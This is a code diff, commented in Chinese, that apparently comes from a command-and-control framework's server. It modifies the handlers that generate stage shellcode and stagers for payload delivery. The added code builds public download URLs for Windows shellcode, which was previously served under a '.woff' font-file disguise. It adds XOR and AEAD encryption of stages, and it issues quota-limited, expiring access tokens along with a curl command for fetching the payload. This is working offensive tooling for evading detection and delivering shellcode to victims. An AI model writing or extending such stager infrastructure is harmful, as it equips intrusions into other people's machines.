@@ -68,6 +68,8 @@ func DynamicStageShellCodeGen(c *gin.Context) {
 		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "WebDelivery不存在"})
 		return
 	}
+	// 按当前 delivery 配置（resource 段名/前缀/CDN）刷新公开 URL
+	delivery.BuildPublicURLs(&wd, delivery.GlobalHub.MainPort())
 
 	// 添加调试日志
 	logx.Infof("[DEBUG] WebDelivery信息: OS=%s, Arch=%s, ListenerConfig=%s, Pass=%s\n", wd.OS, wd.Arch, wd.ListenerConfig, wd.Pass)
@@ -75,8 +77,12 @@ func DynamicStageShellCodeGen(c *gin.Context) {
 	// 构建下载URL - 根据操作系统类型构建不同的URL
 	var connectUrl string
 	if wd.OS == "windows" {
-		// Windows使用.woff后缀
-		connectUrl = wd.ServerAddress + ".woff"
+		// Windows Stager 执行 shellcode：优先使用 shellcode/woff 资源，
+		// 资源段名可配置后不能再靠 ServerAddress + ".woff" 拼路径。
+		connectUrl = wd.ShellcodeURL
+		if connectUrl == "" {
+			connectUrl = wd.ServerAddress
+		}
 	} else {
 		// Linux直接使用文件名，无后缀
 		connectUrl = wd.ServerAddress
@@ -123,6 +129,9 @@ func DynamicStageShellCodeGen(c *gin.Context) {
 		Lightweight: request.Lightweight,
 		Password:    wd.Pass,   // 从WebDelivery读取上线密码
 		XorKey:      wd.XorKey, // Stage XOR 混淆密钥
+		AccessToken: wd.AccessToken,
+		CryptoMode:  wd.CryptoMode,
+		DeliveryKey: delivery.AEADKeyBytes(wd.DeliveryKey),
 	}
 
 	// 创建构建器
@@ -341,12 +350,24 @@ func StageShellCodeGen(c *gin.Context) {
 		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "WebDelivery不存在"})
 		return
 	}
+	if wd.CryptoMode == "aead" || ((wd.CryptoMode == "xor" || wd.CryptoMode == "") && wd.XorKey != 0) {
+		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "加密投递无法使用传统 Stage Shellcode，请改用「分阶段(stage)」动态 Stager"})
+		return
+	}
+	if wd.AccessToken != "" {
+		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "传统 Stage Shellcode 不支持 AccessToken，请改用「分阶段(stage)」动态 Stager"})
+		return
+	}
+	// 资源段名可配置后不能再用 ServerAddress + ".woff" 拼路径
+	delivery.BuildPublicURLs(&wd, delivery.GlobalHub.MainPort())
 
 	// 根据操作系统类型构建不同的URL
 	var connectUrl string
 	if wd.OS == "windows" {
-		// Windows使用.woff后缀
-		connectUrl = wd.ServerAddress + ".woff"
+		connectUrl = wd.ShellcodeURL
+		if connectUrl == "" {
+			connectUrl = wd.ServerAddress
+		}
 	} else {
 		// Linux直接使用文件名，无后缀
 		connectUrl = wd.ServerAddress
@@ -442,6 +463,7 @@ type CreateStagerTokenRequest struct {
 	PublicKey string `json:"public_key"` // 投递 public_key
 	Quota     int    `json:"quota"`      // 配额（默认 3 次）
 	Note      string `json:"note"`       // 备注（如 Stager 标识）
+	TTLHours  int    `json:"ttl_hours"`  // 有效期（小时）；0=不过期
 }
 
 // CreateStagerToken 为指定投递生成配额令牌（每次生成 Stager 时调用一次）
@@ -455,18 +477,30 @@ func CreateStagerToken(c *gin.Context) {
 		c.JSON(http.StatusBadRequest, gin.H{"status": 400, "message": "public_key 不能为空"})
 		return
 	}
-	token, err := delivery.GenerateStagerToken(req.PublicKey, req.Quota, req.Note)
+	if req.Quota <= 0 {
+		req.Quota = 3
+	}
+	var ttl time.Duration
+	if req.TTLHours > 0 {
+		ttl = time.Duration(req.TTLHours) * time.Hour
+	}
+	token, err := delivery.GenerateStagerTokenWithTTL(req.PublicKey, req.Quota, req.Note, ttl)
 	if err != nil {
 		c.JSON(http.StatusInternalServerError, gin.H{"status": 500, "message": err.Error()})
 		return
 	}
+	expiresAt := ""
+	if ttl > 0 {
+		expiresAt = time.Now().Add(ttl).Format("2006-01-02 15:04:05")
+	}
 	c.JSON(http.StatusOK, gin.H{
 		"status": 200,
 		"data": gin.H{
-			"token":  token,
-			"quota":  req.Quota,
-			"header": "X-Delivery-Token: " + token,
-			"curl":   `curl -H "X-Delivery-Token: ` + token + `" <下载URL>`,
+			"token":      token,
+			"quota":      req.Quota,
+			"expires_at": expiresAt,
+			"header":     "X-Delivery-Token: " + token,
+			"curl":       `curl -H "X-Delivery-Token: ` + token + `" <下载URL>`,
 		},
 	})
 }
